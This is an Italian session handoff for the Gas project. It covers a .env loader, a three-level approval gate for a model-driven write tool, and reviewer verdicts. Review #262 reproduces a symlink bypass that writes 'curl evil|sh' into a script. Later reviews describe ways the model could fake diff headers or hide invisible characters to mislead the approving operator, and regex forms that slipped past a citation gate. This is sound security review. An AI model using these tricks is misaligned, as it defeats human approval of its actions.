# HANDOFF — Dossier di fine sessione

**Sessione:** 2026-10-11 — `.env` caricato da Gas + cancello a 3 livelli (1A) + note basse (PR #180)

---

## §0 DECISIONI UMANE RICHIESTE

1. Merge della PR #180 (https://github.com/Gasss23/Gas/pull/180). Numero e URL dall'output reale dello strumento GitHub collegato (`create_pull_request` → `{"id":"4819380155","url":"https://github.com/Gasss23/Gas/pull/180"}`): `gh` nel container non è autenticato («Failed to log in to github.com using token (GH_TOKEN)»). Tocca la macchina di controllo (gate B, fine-task, revisore.md): il merge lo decide l'operatore.
2. Fetta di sicurezza (cancello a 3 livelli): secondo passaggio indipendente nella chat claude.ai con l'URL di questo handoff.
3. Messaggio Telegram del giro notturno: nel messaggio dell'operatore la scelta «[è arrivato / non è arrivato]» è rimasta in bianco → NON confermato.
4. Sul Mac: `git pull` e (facoltativo) ricopiare il plist (`reports/setup_notte.md` passo 4).
5. Limite dichiarato di 1A: decidere se Gas può LEGGERE `gas.py`/`brains/`/`modules/` (oggi vietato), altrimenti il livello 2 serve davvero solo per file piccoli/nuovi, script e config.

---

## §1 SCOPE & ESITO FETTE

- **Fetta 1 — Gas carica il `.env` all'avvio**: FATTA (commit `c6a2998`, review #260 APPROVATO CON RISERVE → #261 APPROVATO).
- **Fetta 2 — schema a 3 livelli del cancello (1A)**: FATTA (commit `3e031f2`, review #262 BOCCIATO → #263 APPROVATO CON RISERVE).
- **Fetta 3 — note basse (V-1/V-2/V-3 #179, F-verdetto-ritoccato, note bot #177, R-263-1)**: FATTA (commit `0480996`, review #264 BOCCIATO → #265 APPROVATO).
- **E2E con Telegram reale**: SALTATA — nessun token/chiave nel container.

---

## §2 GIT DIFF --STAT (sessione)

```
 .claude/agents/memoria_revisore.md |   9 +++++++++
 .claude/agents/revisore.md         |   3 +--
 .claude/commands/fine-task.md      |   2 ++
 .gitignore                         |   1 +
 gas.py                             | 238 ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++--------
 modules/gate/gate.py               |  79 +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++----
 modules/notte/notte.py             |   6 ++++--
 modules/telegram/bot.py            |  64 ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 reports/design_cancello.md         |  34 ++++++++++++++++++++++++++++++++++
 reports/diff_sessione.md           |  27 +++++++++++++++++++++------
 reports/handoff.md                 | 314 ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++--------------------------------------------------------------------
 reports/setup_notte.md             |   3 +++
 reports/stato_progetto.md          |  15 ++++++++++-----
 reports/ultimo_report.md           |  28 ++++++++++++++++------------
 scripts/check_verdetto.py          |   6 +++++-
 scripts/notte/com.gas.notte.plist  |   6 ++++--
 tests/conftest.py                  |   5 +++++
 tests/test_unit_dotenv.py          | 124 ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 tests/test_unit_gate.py            |  97 ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++-----------
 tests/test_unit_handoff_check.py   |  23 +++++++++++++++++++++++
 tests/test_unit_kernel.py          | 240 +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++---------
 21 files changed, 1194 insertions(+), 130 deletions(-)
```

## §3 GIT LOG --ONELINE (sessione)

```
0480996 fix(note-basse): gate B e percorsi Windows, regola verdetti, note bot #177
31517ed chore(revisore): memoria review #265 — APPROVATO
755c5a1 chore(revisore): memoria review #264 — BOCCIATO
3e031f2 feat(cancello): schema a 3 livelli di write_file (decisione operatore 1A)
1ee779b chore(revisore): memoria review #263 — APPROVATO CON RISERVE
477ff0c chore(revisore): memoria review #262 — BOCCIATO
c6a2998 feat(avvio): Gas carica da sé il .env all'avvio (giro notturno, tetto di spesa)
5764c4e chore(revisore): memoria review #261 — APPROVATO
faf1d1e chore(revisore): memoria review #260 — APPROVATO CON RISERVE
```

NB: il commit di fine-task che contiene questo file non compare in questo log, per costruzione. Il suo hash è stampato al passo 5.

## §4 VERDETTO DEL REVISORE (per commit motore)

Sei verdetti, incollati integralmente nell'ordine (#264 e #265 nella versione RIEMESSA dal revisore, originali in §4b). Unica trasformazione: nelle notifiche di #263 e #265 i caratteri `<` e `>` erano arrivati come entità HTML (`&lt;`, `&gt;`) e qui sono riportati come caratteri.

### Review #260 (fetta 1, commit `c6a2998`)

## VERDETTO: APPROVATO CON RISERVE

Review #260 del diff staged sul branch feat/merge-automatico-z1xjx2. Prima della review ho letto CLAUDE.md (sezioni 5, 8 e 9), le voci di reports/stato_progetto.md che parlano di `.env` (righe 166, 168 e 475) e la mia memoria. Ho eseguito di persona i test dei file dotenv e notte (64 passed) e un controllo sul parser con i formati di `.env` più a rischio.

**Elementi del diff esaminati**

- `gas.py:462` — `_carica_dotenv` legge il file, salta commenti e righe vuote, gestisce `export` e le virgolette. Non espande `$VAR`. Ho controllato l'eccezione su un file illeggibile, le righe malformate e la chiave con trattino. Esito: ok. Un'eccezione generica viene intercettata e il warning riporta solo il tipo dell'errore (`gas.py:482`). Il messaggio per una riga scartata contiene il numero di riga e, al massimo, il nome della chiave (`gas.py:500`), mai il valore. Il test `tests/test_unit_dotenv.py:55` lo verifica su `segreto-aperto`.
- `gas.py:504` — c'è la condizione `if chiave in os.environ: continue`. Rischio esaminato: una variabile esportata vuota viene sovrascritta dal file? Esito: ok. Il controllo guarda se la chiave esiste, non se ha un valore, quindi shell, plist e systemd vincono sempre sul file. Il test `tests/test_unit_dotenv.py:47` copre anche il caso della variabile vuota.
- `gas.py:3679` — la chiamata sta come prima istruzione di `main()`, quindi vale per doctor, notte e telegram. Rischio esaminato: un test che chiama `main()` potrebbe caricare le chiavi reali dell'operatore. Esito: ok. Il flag di spegnimento è impostato in `tests/conftest.py:11` per tutta la suite pytest, e in `tests/test_unit_kernel.py:27`. Il file del kernel lo imposta prima della riga che chiama `main()` (`tests/test_unit_kernel.py:4314`, comando `lezioni`). La fixture di `tests/test_unit_dotenv.py:15` lavora su una copia usa e getta dell'ambiente, quindi la suite resta isolata.
- `scripts/notte/com.gas.notte.plist:15` — il `source ./.env` con `set -a` è stato tolto e il venv viene cercato prima in `.venv`, poi in `venv`. Rischio esaminato: la catena si ferma se un venv manca. Esito: ok. Con `[ -f ] && source && break` più `; true` finale si va comunque a `python3 gas.py notte`. È anche un miglioramento di sicurezza: il `.env` non viene più eseguito come codice di shell, e se manca la catena non si blocca più.
- Contesto: `gas.py:1389` (`_sanitized_subprocess_env`). Toglie ai processi lanciati da `run_command` le variabili il cui nome contiene KEY, TOKEN, SECRET e simili. Rispetto a prima non c'è nessuna esposizione nuova: le stesse variabili arrivavano già da `~/.zshrc` o dal `source` del plist. `TELEGRAM_ALLOWED_IDS` non contiene nessuna di quelle parole e passa ai processi figli, ma era così anche prima e non è un segreto.

**Riserve (non bloccanti, da tracciare in stato_progetto.md)**

- **R-260-1 (BASSA)** — Una riga come `KEY="v" # commento` viene scartata con il messaggio «virgolette non chiuse», che è fuorviante. L'ho riprodotto nel controllo: `Z_Q` non viene caricata. Il `source` di zsh, usato finora dal plist, quella riga la accettava. Quindi un `.env` che funzionava col plist vecchio può perdere una variabile, con un solo warning nel log. Correzione: accettare una chiusura di virgolette seguita da spazi e `#`, oppure almeno cambiare il messaggio.
- **R-260-2 (BASSA)** — Se il file inizia con un BOM UTF-8 (un carattere invisibile che alcuni editor aggiungono all'inizio del file), la prima riga viene scartata (riprodotto con `Z_BOM`). Correzione: leggere con `encoding="utf-8-sig"`.
- **R-260-3 (BASSA, documentazione)** — Sul VPS, `gas.py telegram` passa ora dal caricamento del `.env`. Se accanto a gas.py c'è un `.env` vecchio, quel file riempie le variabili che mancano in `.env.prod`. systemd continua a vincere sulle variabili che definisce, ma un file finora ignorato diventa attivo. Va scritto in setup o in stato_progetto.

**Rischi esclusi (non verificati)**

- Il comportamento reale sotto launchd sul Mac: non è riproducibile qui su Linux, dove non ci sono launchd, zsh di sistema né `.venv` dell'operatore.
- Non sappiamo se sul VPS esista oggi un `.env` accanto a `.env.prod`: non ho accesso al server.
- Non ho rieseguito tutta la suite (874 passed, kernel 715/0): quei numeri sono dichiarati dall'agente, io ho riprodotto solo i 64 test di dotenv e notte.

La riga #260 e una lezione nuova sono in `/home/user/Gas/.claude/agents/memoria_revisore.md`. Le ho committate da sole (commit faf1d1e) e il diff staged è rimasto intatto (6 file).

### Review #261 (fetta 1, ri-review, commit `c6a2998`)

## VERDETTO: APPROVATO

Ri-review #261 del diff staged aggiornato: R-260-1 e R-260-2 sono chiuse. Ho rieseguito io stesso pytest completo (875 passed) e `python3 tests/test_unit_kernel.py` (715 PASS, 0 FAIL).

**Elementi del diff esaminati**

- `gas.py:461` — la nuova regex `_DOTENV_VIRGOLETTE` riconosce un valore tra virgolette, anche se seguito da `# commento`, e lo applica all'intera riga (`fullmatch`, `gas.py:500`).
  - Rischi esaminati: valori scelti in modo sbagliato, rallentamenti patologici, valori finiti nei log.
  - Prove fatte:
    - `"a" # c "d"` diventa `a`;
    - `'w'#attaccato` e `"x" y` vengono scartati con il warning, che riporta solo il nome della chiave;
    - `""` diventa il valore vuoto;
    - una riga di 20.000 caratteri senza virgoletta di chiusura viene scartata subito, senza rallentamenti.
  - Esito: ok.
  - Unica stranezza: `"a"b"` viene caricato come `a"b`, mentre zsh lo rifiuterebbe. È cosmetica, non serve tracciarla.
- `gas.py:481` — il file ora si legge con `encoding="utf-8-sig"`.
  - Rischio esaminato: la prima riga persa se il file inizia con il BOM (il carattere invisibile che alcuni editor mettono in testa).
  - Esito: ok. Il BOM viene tolto; i file senza BOM si leggono come prima, e un byte non UTF-8 va ancora nel ramo fail-safe (lo copre il test esistente).
- `tests/test_unit_dotenv.py:47` — il test nuovo copre il BOM, il commento dopo le virgolette (con un `#` anche dentro le virgolette), la riga attaccata `'w'#attaccato` che viene scartata e il caso `"a" # c "d"`.
  - Esito: ok. Usa la stessa fixture isolata `env`, quindi resta separato dal resto della suite.

**Rischi esclusi (non verificati)**

- Il comportamento sotto launchd sul Mac, per lo stesso motivo della #260: qui non ci sono launchd né il `.env` reale dell'operatore.
- La compatibilità completa con la sintassi di zsh (escape `\"`, valori su più righe): non è nello scopo di un parser minimale ed è dichiarata nel docstring.

**Da fare per l'agente**

R-260-3 non risulta ancora in `reports/stato_progetto.md` (la ricerca di «R-260-3» non trova nulla). Va aggiunta prima del commit dei report.

La riga #261 è in `/home/user/Gas/.claude/agents/memoria_revisore.md`, committata da sola (commit 5764c4e).

### Review #262 (fetta 2, prima review — BOCCIATO, non committato)

## VERDETTO: BOCCIATO

La fetta è solida in quasi tutto. Il gate non apre niente di nuovo: su 65.640 percorsi provati, nessuno che prima era vietato in scrittura è sceso al livello 1. Resta però un difetto di logica nel meccanismo della firma, e l'ho riprodotto. Il design dichiara «un symlink con nome innocuo verso un file delicato non passa», ma la protezione copre solo il caso della finestra pulita.

**Motivo bloccante**

- `gas.py:2577` — controllo all'esecuzione: con `firmata=True` legge `_base_sha256` dagli argomenti salvati in coda. Rischio esaminato: da dove arriva quella chiave. Solo nel livello 2 la scrive il kernel (`_prepara_firma_codice`). Nel parcheggio normale del livello 1 la può mettere il modello, perché lì nessuno rifiuta le chiavi extra. **Esito: blocco.**
- `gas.py:1662` — `_parcheggia_e_notifica` decide se una richiesta è di livello 2 con `gate_classify` sul nome scritto dal modello, non sul file vero dietro un eventuale symlink. Rischio: un nome di livello 1 che punta a un file di livello 2. **Esito: blocco**, è il secondo pezzo dello stesso difetto.
- Come l'ho riprodotto (kernel reale in una cartella temporanea): symlink `nota.md` → `scripts/saluto.sh`.
  - Il gate sul nome dà `UNCERTAIN`.
  - Con la finestra contaminata la richiesta va in coda col read-back normale: nome `nota.md`, niente diff, niente pro/contro.
  - All'approvazione `applica_firma` chiama `execute_tool_call(..., firmata=True)`. Al percorso risolto corrisponde il livello 2, e l'impronta messa dal modello coincide.
  - Risultato: `Successo`, e `scripts/saluto.sh` viene sovrascritto con `curl evil|sh`.
  - Variante con symlink pendente verso `brains/nuovo.py` e `_base_sha256: "assente"`: il file viene creato.
- In pratica la firma data a «nota.md» autorizza la scrittura di un file di codice, senza il diff e senza i pro e contro richiesti dalla decisione 1A. Serve un symlink già presente: Gas da solo non può crearlo, e senza questa modifica le cose andavano peggio. Ma è una garanzia di sicurezza dichiarata e non mantenuta.
- `tests/test_unit_kernel.py:7448` — T82i prova solo la finestra pulita. **Esito: riserva**, manca proprio il caso che fallisce.

**Correzione minima richiesta (a scelta, meglio entrambe)**

- (a) In `_parcheggia_e_notifica`, per `write_file`, calcolare il livello sul percorso RISOLTO (`_file_rel_root` + `livello_scrittura`): se è 2, passare sempre da `_prepara_firma_codice`.
- (b) All'esecuzione con `firmata=True` sul livello 2, rifiutare se il livello del nome testuale non è anch'esso 2. In alternativa, togliere/rifiutare `_base_sha256` in ogni parcheggio che non sia di livello 2.
- Più un test: symlink + finestra contaminata + `_base_sha256` messo dal modello → file NON scritto.

**Riserve (non bloccanti, da tracciare)**

1. **MEDIA** — `modules/telegram/bot.py:143`: pro e contro (testo libero del modello, senza limite di lunghezza) stanno PRIMA del diff vero. Il modello può scriverci una finta intestazione «DIFF REALE (calcolato da Gas…)» con un diff innocuo e spingere quello vero in fondo al messaggio. Da fare: diff in cima, pro/contro dopo, con un tetto di lunghezza e le righe che sembrano intestazioni neutralizzate.
2. **MEDIA** — `modules/telegram/bot.py:126`: il read-back e l'intestazione del diff (`gas.py:1597`) mostrano `relative_path` testuale. Con `scripts/link` → `brains/x.py` l'operatore firma un nome che non è il file scritto. Anche un nome con a-capo (accettato su Linux) può falsare righe del messaggio. Va mostrato il percorso risolto (`rel_root`), con i caratteri di controllo resi visibili.
3. **BASSA** — `gas.py:1597`: nel diff i caratteri invisibili restano grezzi.
   - Riprodotto: un file con BOM e CRLF dà `-\ufeffecho a\r` / `+echo a`, righe che su Telegram sembrano uguali.
   - Spazi a larghezza zero e controlli bidi (Trojan Source) passerebbero allo stesso modo.
   - `splitlines` spezza anche su `\u2028`: il marcatore «Senza a-capo finale» compare a metà testo.
4. **BASSA, da dichiarare** — `read_file` resta vietata su `gas.py`, `brains/` e `modules/` (`_DENY_PREFIXES`). Il modello quindi deve riscrivere il file intero senza averlo letto, e il diff supera i 4096 caratteri: in pratica il livello 2 su quei file serve a poco.
5. **BASSA, Windows** — `modules/gate/gate.py:238`: `livello_scrittura` passa per `os.path.normpath` e poi spezza con `PurePosixPath`. Su Windows `modules\gate\gate.py` diventa un pezzo solo e scende al livello 2; anche `dati\.env` non viene riconosciuto. In più `write_text` in modo testo cambia gli a-capo rispetto al diff. Va dichiarato che Windows è fuori dal modello di minaccia.

**Elementi verificati come corretti**

- `modules/gate/gate.py:319` — `gate_classify("write_file")`: livello 3 → DENY, 2 → IRREVERSIBLE, 1 → prosegue come prima. Rischio: che qualcosa diventi più libero. Confronto automatico tra il vecchio `_check_path_arg(write=True)` e `livello_scrittura` su 65.640 combinazioni (fullwidth, `gate.`, `modules./gate`, MAIUSCOLE, `..`): 0 casi più permissivi, 152 più severi (solo `.`/`x/..` → 3). **ok**
- `gas.py:2568` — livello ricalcolato sul percorso risolto. Il livello 3 viene negato anche con firma. Su macOS (file system che non distingue maiuscole) `MODULES/GATE` passa per il casefold e dà comunque 3. **ok**
- `gas.py:1605` — `_prepara_firma_codice`: rifiuta le chiavi extra, sovrascrive `_base_sha256` col valore calcolato dal kernel prima di accodare (quindi l'impronta è coperta dall'hash della coda e il doppione resta coerente), un file non UTF-8 porta al diniego. Restano corretti anche il tetto delle richieste in attesa e la revoca quando il messaggio è troppo grande. **ok**
- Giro notturno (`modules/notte/notte.py:92`): non chiama mai `execute_tool_call` con `firmata=True`; un livello 2 notturno finisce in coda e manda la richiesta su Telegram. Nessuna nuova strada per scrivere. **ok**
- Esiti riprodotti: pytest 942 passed; `tests/test_unit_kernel.py` 735 PASS, 0 FAIL.

**Rischi esclusi esplicitamente**

- Comportamento su Windows non eseguito: niente ambiente, l'ho solo ragionato dal codice.
- Hard link già presenti verso file di livello 2: non verificati. Gas non può crearli e sono fuori dallo scopo di questa fetta.
- Gara tra il controllo dell'impronta e la scrittura (un processo concorrente che cambia il file in quella finestra): non provata, la finestra è dell'ordine dei microsecondi.
- Resa reale del messaggio su Telegram (bidi, `\r`): valutata solo sul testo, non sul client.

Memoria aggiornata con la riga #262 e la lezione, committata come 477ff0c. Lo staging del diff sotto review è intatto.

File rilevanti:
- /home/user/Gas/gas.py
- /home/user/Gas/modules/gate/gate.py
- /home/user/Gas/modules/telegram/bot.py
- /home/user/Gas/tests/test_unit_kernel.py
- /home/user/Gas/reports/design_cancello.md
- /home/user/Gas/.claude/agents/memoria_revisore.md

### Review #263 (fetta 2, ri-review, commit `3e031f2`)

## VERDETTO: APPROVATO CON RISERVE

La ri-review #263 chiude il blocco della #262: ho rilanciato l'attacco col symlink sul codice corretto e ora viene negato. Restano una riserva bassa sui caratteri invisibili e il controllo dei limiti dichiarati.

**Elementi del diff esaminati**

- `gas.py:2620` — all'esecuzione con firma, un file di livello 2 si scrive solo se `_file_reale` coincide col percorso risolto e l'impronta è la stessa.
  - Rischio esaminato: una firma data a un'altra richiesta che apre la scrittura del codice.
  - `_file_reale` lo scrive solo `_prepara_firma_codice`. L'unico punto di produzione che mette in coda le richieste è `_parcheggia_e_notifica` (`enqueue_approval` non ha chiamanti fuori dai test).
  - Una vecchia richiesta di livello 1 ancora in coda, o un symlink cambiato tra la richiesta e la firma, porta al diniego. Anche un `GAS_CWD` diverso tra il kernel che chiede e quello che esegue porta al diniego, se il file risolto non è lo stesso.
  - Riprodotto: `_file_reale="nota.md"` con firma → «non è quello mostrato».
  - Mutation (controllo tolto) → T82i fallisce. **ok**
- `gas.py:1704` — un `write_file` che non è di livello 2 ma contiene `_base_sha256` o `_file_reale` viene negato prima di entrare in coda. Riprodotto: «argomenti riservati al kernel». Mutation (controllo tolto) → T82i fallisce. **ok**
- `gas.py:1616` e `gas.py:2813` — `_write_livello2` decide sul nome OPPURE sul percorso risolto, e un `UNCERTAIN` che risolve al livello 2 diventa `IRREVERSIBLE`.
  - Riprodotto: symlink `nota.md` → `scripts/saluto.sh` con la finestra contaminata e l'impronta messa dal modello → «servono pro e contro», nessuna richiesta in coda.
  - Se `_write_livello2` va in eccezione restituisce `False`. Non è un buco: l'esecuzione esige comunque `_file_reale`. **ok**
- `modules/telegram/bot.py:166` — il read-back mostra il file vero, con «(chiesto come «nota.md»)» se il nome è diverso, poi il diff, poi pro e contro.
  - Rischio esaminato: falsificare il messaggio.
  - Il contenuto entra nel messaggio solo come righe del diff, ognuna con il prefisso ` `, `+` o `-`. Pro e contro sono rientrati con `│ ` da `modules/telegram/bot.py:142`.
  - Verificato: una finta intestazione «DIFF REALE» scritta dentro pro esce come `│ DIFF REALE…`. **ok**
- `modules/telegram/bot.py:127` — `rendi_visibili`: nel diff reale `\r` diventa `<U+000D>`, lo spazio a larghezza zero `<U+200B>`, il controllo bidi `<U+202E>`. Ora il diff si spezza solo su `\n`. **riserva** (sotto)

**Riserva**

- **R-263-1 (BASSA)** — `rendi_visibili` controlla solo le categorie Cc/Cf/Zl/Zp/Co/Cs/Cn. Restano invisibili nelle righe `+` del diff:
  - i selettori di variante (categoria Mn, es. U+FE0F, U+E0100…), che possono nascondere byte nel testo;
  - i riempitivi «Lo» come U+3164;
  - gli spazi non standard (Zs, es. NBSP).
  
  Verificato: `'a\xa0b\ufe0fc…ㅤe'` esce invariato. Non permettono di scrivere un file senza firma, ma due righe diverse possono sembrare uguali all'operatore. Correzione semplice: marcare anche Mn quando non c'è un carattere base visibile, oppure i blocchi U+FE00–FE0F e U+E0100–E01EF, più U+3164/U+115F/U+1160 e gli Zs diversi dallo spazio normale.

**Limiti dichiarati nel design (`reports/design_cancello.md` §5b), verificati come presenti**

- Il modello non può leggere `gas.py`, `brains/` e `modules/`, e i diff sopra 4096 caratteri non passano su Telegram.
- Windows è fuori dal modello di minaccia.
- Gli hard link già presenti non sono coperti.

**Esiti riprodotti**

- pytest: 942 passed.
- `tests/test_unit_kernel.py`: 743 PASS, 0 FAIL.
- Mutation fatte su una copia completa in cartella temporanea, mai sul repo: 742/1 per ciascuno dei due controlli nuovi.

**Rischi esclusi esplicitamente**

- Come il client Telegram mostra davvero `<U+XXXX>` e i caratteri in categoria Mn: non verificato, ho controllato solo il testo composto.
- Una gara tra due processi nell'istante fra il controllo dell'impronta e la scrittura: non provata (finestra di microsecondi, nessun processo concorrente scrive file di livello 2 senza firma).
- Il comportamento su macOS: solo ragionato dal codice (casefold, `resolve` mantiene le maiuscole/minuscole sia alla richiesta sia all'esecuzione, quindi `_file_reale` coincide), non eseguito.

Ho scritto in memoria la riga contatore #263 e l'ho committata (1ee779b). Nella riga ho scritto per errore i numeri di riga gas.py:2621, gas.py:1705 e gas.py:2812: quelli giusti sono gas.py:2620, gas.py:1704 e gas.py:2813, che sono quelli citati in questo verdetto. Lo staging del diff sotto review è intatto.

File rilevanti:
- /home/user/Gas/gas.py
- /home/user/Gas/modules/telegram/bot.py
- /home/user/Gas/modules/gate/gate.py
- /home/user/Gas/tests/test_unit_kernel.py
- /home/user/Gas/reports/design_cancello.md
- /home/user/Gas/.claude/agents/memoria_revisore.md

### Review #264 RIEMESSO (fetta 3, prima review — BOCCIATO, non committato)

Testo riemesso dal revisore su richiesta (regola F-verdetto-ritoccato): l'originale contiene esempi di regex in forma `path:riga` che il gate B legge come citazioni inesistenti; l'originale integrale è nella sezione «§4b» qui sotto.

## VERDETTO: BOCCIATO

(Verdetto #264 RIEMESSO su richiesta, regola F-verdetto-ritoccato: stesso esito e stessa sostanza dell'originale. Cambia solo la forma: gli esempi di regex non hanno più i due punti, così il gate non li legge come citazioni. La riga del regex è citata dove si trova oggi a HEAD: dopo la fix si è spostata da 44 a 46.)

**Motivo del blocco (macchina di controllo, il gate B si indebolisce in alcuni casi).**

- scripts/check_verdetto.py:46 — regex delle citazioni `_REF_RE`. Rischio esaminato: citazioni legittime perse o forme nuove accettate. Esito: **blocco**. Il primo lookbehind (backslash, lettera, due punti) impediva che un match partisse subito dopo quei caratteri. Però il motore regex ripartiva più avanti dentro lo stesso token, dopo una barra, un punto o un trattino. Confronto tra vecchio e nuovo regex:
  - «D, due punti, x/gas.py, riga 5»: prima catturava x/gas.py, che non esiste a HEAD, quindi veniva rifiutato; con la prima fix catturava gas.py riga 5, accettata.
  - «C, due punti, \x\a.gas.py, riga 4»: prima a.gas.py, rifiutata; poi gas.py riga 4, accettata.
  - «C, due punti, \x\y/gas.py, riga 4»: prima y/gas.py, rifiutata; poi gas.py riga 4, accettata.
  - «C, due punti, \x\modules/telegram/bot.py, riga 4»: con la prima fix catturava telegram/bot.py, risolta per suffisso da `_resolve_path` (scripts/check_verdetto.py:189).

  Una fix al gate che lo rende più permissivo anche su un solo input è un blocco. Fix proposta: mettere nel lookbehind tutta la classe di caratteri del token, quindi anche punto, barra e trattino. Le citazioni legittime restano catturate: nome corto tra backtick, path tra parentesi, path in grassetto, intervalli, nomi con più punti. I percorsi relativi con «..» e quelli assoluti restano catturati e vengono rifiutati da `_resolve_path` come prima.

**Elementi esaminati**
- tests/test_unit_handoff_check.py:393 — due test nuovi, verdi (303 passed su gate e handoff_check). Coprivano solo la forma «C, due punti, backslash» e la lettera di unità seguita subito dal nome, non le forme miste. Esito: **riserva**, è proprio il buco del blocco.
- .claude/agents/revisore.md:60 — la frase sulle citazioni di contesto ora è intera, il significato non cambia. Esito: **ok**.
- .claude/commands/fine-task.md:243 — regola F-verdetto-ritoccato: mai ritoccare il verdetto, si chiede al revisore di riemetterlo e lo si dichiara accanto all'originale. È coerente col finding aperto in reports/stato_progetto.md:161 e rende la procedura più severa. Esito: **ok**.
- .gitignore:8 — la riga per `.gas_history.json.*` copre i file tmp e corrupt scritti da gas.py:832 e gas.py:845. `.gas_history.json` resta ignorato e viene forzato con force-add come prima. Esito: **ok**.
- modules/notte/notte.py:18 e modules/notte/notte.py:150 — solo a capo. La concatenazione implicita della f-string dà la stessa stringa. Esito: **ok**.
- modules/telegram/bot.py:128 e modules/telegram/bot.py:140 — R-263-1 chiusa per NBSP, spazio ideografico, i selettori di variante FE00–FE0F ed E0100–E01EF e i riempitivi Hangul (verificato a mano). Nel test tests/test_unit_gate.py:515 ho controllato che i caratteri letterali FE0F e U+3164 sono davvero nel sorgente. Esito: **riserva R-264-2 (BASSA)**: restano invisibili U+034F (un carattere di unione invisibile, categoria Mn) e U+2800 (braille vuoto, So). Effetto collaterale accettato: il read-back mostra il cuore seguito da `<U+FE0F>` sulle emoji; è rumore, non un problema di sicurezza.

**Rischio escluso**: non ho rilanciato la suite completa (945) né la sonda del kernel (743/0). Ho eseguito solo tests/test_unit_gate.py e tests/test_unit_handoff_check.py, perché la fetta non tocca gas.py. Non ho nemmeno verificato check_verdetto.py su un handoff reale: l'ho provato solo sul regex isolato e sui test.

### Review #265 RIEMESSO (fetta 3, ri-review, commit `0480996`)

Testo riemesso dal revisore su richiesta (stesso motivo); l'originale integrale è nella sezione «§4b» qui sotto.

## VERDETTO: APPROVATO

(Verdetto #265 RIEMESSO su richiesta, regola F-verdetto-ritoccato: stesso esito e stessa sostanza dell'originale. Cambia solo la forma: gli esempi di regex non hanno più i due punti.)

Ri-review dopo la bocciatura #264. Le due cose che avevo chiesto sono state fatte: il gate B non accetta più le forme miste e i caratteri invisibili mancanti ora vengono mostrati.

**Elementi esaminati**
- scripts/check_verdetto.py:46 — ora il lookbehind contiene tutta la classe di caratteri del token (backslash, lettera, due punti, punto, barra, trattino). Così il regex non può più ripartire a metà di un percorso. Rischio esaminato: perdita di citazioni legittime. Ho confrontato vecchio e nuovo regex su testi veri:
  - in reports/handoff.md le citazioni trovate sono 14 sia prima sia dopo;
  - in .claude/agents/memoria_revisore.md passano da 389 a 386, e le 3 perse sono proprio le forme d'attacco che avevo scritto io nella #264.

  Il gate è più severo di prima e non ha perso nulla di legittimo. Esito: **ok**.
- tests/test_unit_handoff_check.py:401 — il test controlla che le 4 forme miste non vengano catturate e che le forme legittime restino catturate: intervallo, nome con più punti, percorso con «..», backtick, parentesi, grassetto. Esito: **ok**.
- modules/telegram/bot.py:128 — U+034F (un carattere di unione invisibile) e U+2800 (braille vuoto) sono aggiunti a `_INVISIBILI_EXTRA`. L'ho verificato a mano: escono come `<U+034F>` e `<U+2800>`. Con questo R-264-2 è chiusa. Esito: **ok**.
- tests/test_unit_gate.py:522 — il test copre i due caratteri nuovi. Esito: **ok**.
- Le altre modifiche della fetta sono le stesse che avevo già giudicato ok nella #264: .claude/agents/revisore.md, .claude/commands/fine-task.md, .gitignore, modules/notte/notte.py.

**Rischio escluso**: non ho rilanciato la suite completa (945 passed secondo l'agente) né la sonda del kernel. Ho eseguito solo tests/test_unit_gate.py e tests/test_unit_handoff_check.py (303 passed) e il confronto sul corpus reale. Non ho fatto girare check_verdetto.py sull'handoff finale della sessione, perché quell'handoff non esiste ancora.

## §4b VERDETTI ORIGINALI #264 E #265 (fuori dal §4, dichiarato)

Testi originali integrali, conservati per trasparenza. Stanno FUORI dal §4 perché contengono esempi di regex in forma `path:riga` (file inesistenti) che il gate B legge come citazioni: dentro il §4 il gate resta rosso anche coi riemessi accanto. NB: la regola nuova di `.claude/commands/fine-task.md` dice «accanto all'originale nel §4»; qui non è applicabile alla lettera → da precisare (vedi §7). Il verdetto #264 originale cita la riga 44 di check_verdetto.py, oggi 46. Unica differenza di forma: la prima riga «## VERDETTO: …» è resa in grassetto per non aprire un blocco verdetto del gate.

#### Review #264 ORIGINALE (fetta 3, prima review — BOCCIATO, non committato)

**VERDETTO (originale):** BOCCIATO

**Motivo del blocco (macchina di controllo, il gate B si indebolisce in alcuni casi).**

- `scripts/check_verdetto.py:44`: il lookbehind `(?<![\\\w:])` impedisce che un match **parta** subito dopo `\`, una lettera o `:`. Però il motore regex riparte più avanti, dentro lo stesso token, dopo un `/`, un `.` o un `-`, perché questi caratteri non sono nel lookbehind. Ho confrontato vecchio e nuovo regex sulle stesse stringhe:

| input | prima della fix | dopo la fix |
|---|---|---|
| `D:x/gas.py:5` | `x/gas.py` → «file non trovato a HEAD» → **rifiutata** | `gas.py:5` → **accettata** |
| `C:\x\a.gas.py:4` | `a.gas.py` → rifiutata | `gas.py:4` → accettata |
| `C:\x\y/gas.py:4` | `y/gas.py` → rifiutata | `gas.py:4` → accettata |
| `C:\x\modules/telegram/bot.py:4` | `modules/telegram/bot.py` | `telegram/bot.py`, risolta per suffisso tramite `scripts/check_verdetto.py:187` |

  Il caso V-2 segnalato (`C:\x\gas.py:4`) ora è chiuso. Però si aprono forme miste che prima il gate rifiutava. Una fix al gate che lo rende più permissivo anche su un solo input è un blocco.
